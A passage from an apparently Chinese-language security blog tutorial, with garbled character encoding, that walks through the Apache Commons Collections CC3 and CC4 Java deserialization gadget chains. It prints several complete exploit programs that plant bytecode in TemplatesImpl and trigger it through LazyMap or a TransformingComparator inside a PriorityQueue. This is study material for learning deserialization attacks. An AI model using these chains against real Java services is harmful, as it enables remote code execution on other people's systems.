org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç”¨ CC6 é“¾çš„å‰åŠéƒ¨åˆ†é“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3FinalEXP2</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// é˜²æ­¢åœ¨ååºåˆ—åŒ–å‰å¼¹è®¡ç®—å™¨  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazyMap.remove(<span class="hljs-string">&quot;key&quot;</span>);  <br>  <br> <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMap, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p><code>CC4</code>ç®€å•è¯´å°±æ˜¯æ‰¾äº†æ¡å…¶å®ƒçš„è·¯å®ç°<code>transform</code>æ–¹æ³•</p><p>CC4 é“¾ä¸Šå»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œè¿™é‡Œæ‰¾é™¤äº†å®ƒè°è¿˜è°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">InstantiateTransformer ä¸‹å­˜åœ¨ <span class="hljs-attribute">transform</span>æ–¹æ³•<br></code></pre></td></tr></table></figure><p>åœ¨ <code>TransformingComparator</code> è¿™ä¸ªç±»ä¸­çš„ <code>compare()</code> æ–¹æ³•è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformingComparator.java </span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å»æ‰¾è°è°ƒç”¨äº†è¿™ä¸ª<code>compare</code>æ–¹æ³•ï¼š</p><p><code>riorityQueue</code> è¿™ä¸ªç±»ä¸­çš„ <code>siftDownUsingComparator()</code> æ–¹æ³•è°ƒç”¨äº†ä¹‹å‰çš„ <code>compare()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.java</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åŒç±»ä¸‹çš„<code>siftDown</code>è°ƒç”¨äº†è¿™ä¸ª<code>siftDownUsingComparator</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>siftDown</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå†é‡å†™çš„<code>PriorityQueue.readObject()</code>å­˜åœ¨è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>       <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br><br>       s.defaultReadObject();<br><br>       s.readInt();<br><br>       queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>           queue[i] = s.readObject();<br><br>       heapify();<br>   &#125;<br></code></pre></td></tr></table></figure><p>é€»è¾‘ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject() -&gt;</span> heapify<br><span class="hljs-function"><span class="hljs-title">heapify</span> -&gt;</span> siftDown<br><span class="hljs-function"><span class="hljs-title">siftDown</span> -&gt;</span>siftDownUsingComparator<br><span class="hljs-function"><span class="hljs-title">siftDownUsingComparator</span>-&gt;</span>compare<br><span class="hljs-function"><span class="hljs-title">compare</span> -&gt;</span>transformer.transform()<br></code></pre></td></tr></table></figure><p>é“¾å­çš„å°¾éƒ¨å°±æ˜¯<code>InstantiateTransformer.transform()</code>ï¼Œè¿™é‡Œç›´æ¥ç”¨å‰é¢<code>CC3</code>é‚£éƒ¨åˆ†å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// æ„é€  InstantiateTransformer.transform çš„ EXPpublic class TransformOriEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br>  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§å‰é¢çš„é€»è¾‘ï¼ŒæŠŠ<code>instantiateTransformer.transform(TrAXFilter.class); </code>æ¢ä¸ªæ–¹æ³•æ‰§è¡Œï¼š</p><p><code>compare</code>æ–¹æ³•å»è°ƒè¿™ä¸ª<code>transform</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComparatorEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•è¯´å°±æ˜¯ä¸‹é¢è¿™ä¸ªä¸œè¥¿å’Œååºåˆ—åŒ–é…åˆå°±èƒ½è°ƒç”¨<code>instantiateTransformer.transform(TrAXFilter.class);  </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator); <br></code></pre></td></tr></table></figure><p>ä¸ºå•¥å‘¢ï¼Ÿæ³¨æ„è¿™æ®µæ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> &#123;<br>        <span class="hljs-built_in">this</span>(transformer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComparableComparator</span>());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructs an instance with the given Transformer and Comparator.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer  what will transform the arguments to &lt;code&gt;compare&lt;/code&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> decorated  the decorated Comparator</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br><span class="hljs-comment">//åœ¨Javaä¸­ï¼Œé€šè¿‡ä½¿ç”¨ this() å…³é”®å­—å¯ä»¥åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ä¸­è°ƒç”¨åŒä¸€ä¸ªç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°</span><br><span class="hljs-comment">//è¯´ç™½äº†è¿™é‡Œå°±æ˜¯ç»™transformerèµ‹å€¼æˆchainedTransformerï¼Œç„¶åå»è°ƒå®ƒçš„transformæ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>ä½†è¿™é‡Œåºåˆ—åŒ–åååºåˆ—åŒ–æ˜¯ä¸ä¼šå¼¹è®¡ç®—å™¨çš„ï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">å‚è€ƒæ–‡ç« </a></p><p>ç®€å•è®²å°±æ˜¯è¿™ä¸ªä¼˜å…ˆé˜Ÿåˆ—çš„é•¿åº¦å¾—æ˜¯2ï¼Œæ‰èƒ½è¿›<code>SitDown</code>æ–¹æ³•é‡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  